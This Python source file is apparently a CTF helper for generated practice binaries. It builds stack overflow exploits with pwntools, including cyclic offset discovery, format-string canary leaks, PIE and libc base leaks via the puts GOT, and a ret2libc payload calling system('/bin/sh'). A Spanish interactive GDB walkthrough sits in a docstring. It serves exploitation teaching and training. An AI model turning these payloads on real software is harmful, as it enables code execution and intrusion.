from pwnlib.elf.elf import ELF
from pwnlib.context import context
from pwnlib.util.packing import *
from pwnlib.util.cyclic import cyclic, cyclic_find
from pwnlib.rop.rop import ROP
from pwngen.templates.solve import SOLVER
from jinja2 import Environment, BaseLoader

class Template:

    def __init__(self, output: str,
                 difficulty: int):
        self._input = Environment(loader=BaseLoader()).from_string(SOLVER)
        self._output = output
        self._difficulty = difficulty
    
    def gen_example(self):
        flags = {
            'aslr': False,
            'pie': False,
            'real_canary': False,
            'false_canary': False,
        }

        if self._difficulty > 0:
            flags['false_canary'] = True
        if self._difficulty > 1:
            flags['easy_leak'] = True
            flags['real_canary'] = True
            flags['false_canary'] = True
        if self._difficulty > 2:
            flags['aslr'] = True
            flags['pie'] = True
        if self._difficulty > 3:
            flags['easy_leak'] = False
        processed = self._input.render(**flags)
        with open(f'{self._output}-helper.py', 'w') as f:
            f.write(processed)

class Solver:

    def __init__(self, binary_path: str):
        self._elf: ELF = ELF(binary_path) # type: ignore
        context.binary = self._elf
        self._libc: ELF = self._elf.libc # type: ignore
        self._eip_offset = 0
        self._canary = 0
        self._canary_offset = 0
        self._ebp_offset = 0
        self._fmtstr_leaks = {}
        self._rop = ROP(self._elf)

    def _set_libc_base(self, offset: int, libc_fn: str):
        self._libc.address = offset - self._libc.sym[libc_fn]

    def _set_elf_base(self, leak: int, base: int):
        self._elf.address = leak - (leak - base)

    def _ret2win_addr(self, arch: str = "32") -> int:
        if arch == "32":
            return p32(self._elf.symbols['ret2win'])
        elif arch == "64":
            return p64(self._elf.symbols['ret2win'])
        else:
            return -1

    def _calculate_canary_offset(self, ebp: int, esp: int) -> int:
        return (ebp - esp - 0xc) // 4

    def _leak_addr_payload(self, offset: int) -> str:
        leaker = f"%{offset}$p"
        return leaker

    def _generate_payload(self) -> bytes:
        self._payload = b""
        return self._payload

    def get_canary_fmtstr(self, ebp: int, esp: int) -> str:
        self._fmtstr_leaks['canary'] = self._leak_addr_payload(
            self._calculate_canary_offset(ebp, esp))
        return self._fmtstr_leaks['canary']

    def get_stack_fmtstr(self, index: int) -> str:
        self._fmtstr_leaks['stack'] = self._leak_addr_payload(index)
        return self._fmtstr_leaks['stack']

    def leak_libc(self, libc_fn: str, fn_return: str) -> bytes:
        payload = p32(self._elf.got['puts'])
        payload += p32(self._elf.sym[fn_return])
        payload += p32(self._elf.got[libc_fn])
        return payload

    def set_ebp_offset(self, offset: int):
        self._ebp_offset = offset
        return self._ebp_offset

    def set_libc_base(self, leaked_addr: int, leaked_fn: str):
        self._set_libc_base(leaked_addr, leaked_fn)
    
    def set_elf_base(self, leaked_addr: int, base: int):
        self._set_elf_base(leaked_addr, base)
    
    def set_canary(self, canary: int):
        self._canary = canary

    def gen_ret2libc(self):
        payload = p32(self._libc.sym['system'])
        payload += p32(self._libc.sym['exit'])
        payload += p32(next(self._libc.search(b"/bin/sh\x00")))
        return payload

    def gen_payload_base(self):
        payload = b"B"*self._canary_offset
        if self._canary_offset > 0:
            payload += p32(self._canary)
        payload += b"B"*(self._eip_offset - len(payload))
        return payload

    def gen_final_payload(self) -> bytes:
        payload = self.gen_payload_base()
        payload += self.gen_ret2libc()
        return payload

    def gen_cyclic(self, size: int):
        return cyclic(length=size).decode() # type: ignore

    def find_canary_offset(self, canary: int):
        self._canary_offset = cyclic_find(canary)
        return self._canary_offset

    def find_eip_offset(self, eip: int):
        self._eip_offset = cyclic_find(eip)
        return self._eip_offset

    def makes_sense(self) -> bool:
        return self._canary_offset < self._eip_offset

# 1. disassemble input_XXX
# 2. Buscar offset de call fgets del leak
# 3. b *input_XXX + offset
# 4. continuamos hasta ahí
# 5. (EBP - ESP - 0xc // 4) = %VALOR$p -> Nos da el leak de canario
"""
print("Bienvenido al helper de PWN! Espero que te sirva de gran utilidad!")
binario = input("Introduce el path del binario: ")
solver = Solver(binario)
print(f"Abre el binario en GDB mediante: gdb {binario}!")
print(f"Establece un breakpoint en la función main para que cargue todo: b main")
print("Y ahora lo ejecutamos con: run")
print("Primero vamos a calcular el offset al registro EIP, para ello necesitamos ir a la función vulnerable e introducir un payload ciclico, por ejemplo:")
print(solver.gen_cyclic(120))
print("Cuando lo introduzcas en la función vulnerable, dependiendo de las mitigaciones habilitadas, el resultado podría ser diferente.")
print("Si la función tiene leak con format string, introduce el parametro en la segunda función de input")
print("Al continuar el programa debería haber fallado, en caso de que no sea así, la longitud del payload no fue suficiente, intentalo con otro más largo!")
print("Cual es el valor que tienes en el EIP? Puedes usar el comando 'bt' para ver el callstack, busca el valor justo despues de la función de input")
offset_eip = int(input("Valor en el EIP: "), 16)
print(f"El offset que hay hasta el EIP es: {solver.find_eip_offset(offset_eip)}")

# IF REAL_CANARY
print("El binario tiene un canario, sigue los siguientes pasos!")
leak_fn = input("Cual es la función que tiene el leak?? ")
print("Primero vas a sacar el offset en el buffer overflow hasta el canario, necesitas establecer un breakpoint antes de terminar la función, usa: 'b strcat'")
print("Ahora necesitas inyectar el código cíclico antes generado para poder calcular offsets")
print("En cuanto llegue al breakpoint, vas a revisar el valor del canario, este se úbica en la dirección $ebp - 0xc, usa el siguiente comando: 'x/x $ebp - 0xc'")
canary_offset = int(input("Cual es el valor que tiene esa dirección? "), 16)
solver.find_canary_offset(canary_offset)
if not solver.makes_sense():
    print("Hay algo mal, repite la ejecución y asegurate que los valores están bien, el offset al canario no puede ser mayor o igual al del EIP")
    exit(1)
print("Ahora necesitas sacar el offset del format string del canario, vas a parar antes de la llamada a la función de fgets")
print("Para ello escribe el siguiente comando")
print(f"Escribe este comando: disassemble {leak_fn}")
print("Busca el offset de la función fgets, por ejemplo, input_0 +54")
offset_bp = input("Cual es el offset de fgets? ")
print(f"Muy bien, entonces vamos a parar la ejecución justo antes de que llegue con el comando: b *{leak_fn} + {offset_bp}")
print("Continuamos la ejecución ejecutando: continue")
print("Debemos ver que ha parado justo antes de la llamada, ahora necesitamos recuperar dos valores, EBP y ESP")
print("Para ello usa el comando 'p $esp' para saber el valor del ESP y 'p $ebp' para el del EBP")
ebp = int(input("Cual es el valor del EBP? "), 16)
esp = int(input("Cual es el valor del ESP? "), 16)
print("Con esos valores y mediante el cálculo de (EBP - ESP - 0xc) // 4 podremos saber el offset del format string")
canary_fmtstr = solver.get_canary_fmtstr(ebp, esp)
print(f"El valor que leakea el canario es: {canary_fmtstr}")
print("Pruebalo a ver que sucede al introducir ese valor, debería devolver un resultado acabado en 00, presiona 'continue'")
canario = int(input("Cual ha sido el valor devuelto? En caso de que acabe en 00 ya tienes bajo control el canario! "), 16)
solver.set_canary(canario)

# ENDIF

# IF PIE
print("El binario tiene PIE, vamos a leakear la base!")
print("Para ello, vamos a hacer un poco de fuerza bruta sobre el format string, necesitamos recuperar un valor del formato 0x56XXXX o similar")
print("Introduce en el format string algo tal que así: " + "%p "* 7)
print("Has obtenido algún valor del stack? En caso de que no, intentalo con más offsets, por ejemplo %8$p, %9$p... ")
print("Una vez hayas conseguido un valor similar al stack, vamos a calcular el offset a la base!")
print("Para ello primero necesitas conocer la dirección de la base, puedes usar este comando: 'info proc mappings' y el start addr más bajo de tu binario será la base!")
base = int(input("Cual es la base del binario? "), 16)
stack_leak = int(input("Cual es el leak del stack que has conseguido? "), 16)
stack_leak_offset = int(input("En que offset estaba? Por ejemplo: %p %p %p -> 0x10 0xffXXXX 0x56XXXX sería el offset 3"))
solver.set_elf_base(stack_leak, base)
print("Muy bien, así seras capaz de saber la base del binario y poder usar la GOT y PLT!")
# ENDIF

# IF ASLR
print("El binario tiene ASLR, vamos a leakear la dirección de LIBC!")
print("Para ello necesitas saber de una función de libc que esté en la GOT, por ejemplo, 'puts'. Puedes usar el comando: \"p 'puts@got.plt'\"")
print("Nos debería devolver su dirección, en caso de que sea así, podremos leakear su dirección de LIBC")
print("En caso de que no haya resultado, busca otra función en la GOT, puedes usar objdump sobre el binario y revisar la GOT y PLT en busca de funciones de LIBC")
print("Vamos a probar a generar el leak, para ello necesitas cambiar las funciones del exploit para que apunten a la función puts, returnen a la función explotable y por último como argumento le damos la función de puts")
print("Por ejemplo, AAAAAAAAA + canario + dirección PLT puts + dirección función explotable + dirección GOT puts, si tenemos los leaks de PIE o no hay PIE, podemos usar pwntools o esta misma clase")
print("El payload se va a escribir en un fichero llamado aslr_payload.txt")

with open("aslr_payload.txt", "wb") as f:
    f.write(solver.gen_payload_base())
    f.write(solver.leak_libc("__libc_start_main", leak_fn))
print("Hecho, intenta meter ese payload al binario y debería devolverte una dirección de memoria.")
leak_libc = int(input("Cual ha sido la dirección de memoria devuelta? "), 16)
solver.set_libc_base(leak_libc, "__libc_start_main")
# ENDIF

solver.gen_final_payload()
"""